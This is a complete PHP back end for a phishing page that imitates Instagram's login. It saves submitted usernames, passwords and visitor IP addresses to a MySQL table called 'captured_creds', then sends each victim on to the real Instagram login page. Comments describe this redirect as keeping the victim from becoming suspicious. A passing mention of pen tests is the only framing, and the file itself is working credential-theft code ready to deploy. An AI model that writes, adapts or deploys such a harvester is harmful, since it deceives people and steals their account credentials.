<?php
// Configuration (CHANGE THESE VALUES)
$servername = "localhost"; 
$db_username = "root"; // <--- CHANGED to 'root'
$db_password = "";      // <--- CHANGED to an empty string '' (two single quotes with nothing in between)
$db_name = "phish_db";
$table_name = "captured_creds";

// Get the credentials submitted from the HTML form
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// 1. Validate the input (Basic Check)
if (empty($username) || empty($password)) {
    // Redirect to a safe page if required data is missing
    header("Location: https://www.instagram.com/accounts/login/");
    exit;
}

// 2. Database Connection
$conn = new mysqli($servername, $db_username, $db_password, $db_name);

// Check connection
if ($conn->connect_error) {
    // Log the error internally and still redirect the user to avoid suspicion
    error_log("Database Connection failed: " . $conn->connect_error);
    header("Location: https://www.instagram.com/accounts/login/");
    exit;
}

// 3. Prepare and Bind to prevent SQL Injection
// Using prepared statements is crucial for any real-world application, even for a pen tests.
$stmt = $conn->prepare("INSERT INTO $table_name (username, password, ip_address, capture_time) VALUES (?, ?, ?, NOW())");

// Get the user's IP Address
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';

// Bind parameters
// "sss" means three string variables
$stmt->bind_param("sss", $username, $password, $ip_address);

// 4. Execute the statement
if ($stmt->execute()) {
    // Success: credentials were saved.
    // NOTE: This part can be silent or you can log a success message.
} else {
    // Error saving data.
    error_log("Error saving credentials: " . $stmt->error);
}

// 5. Cleanup
$stmt->close();
$conn->close();

// 6. Final step: Redirect the user to the real Instagram page
// This completes the illusion and prevents the user from being suspicious.
header("Location: https://www.instagram.com/accounts/login/");
exit;
?>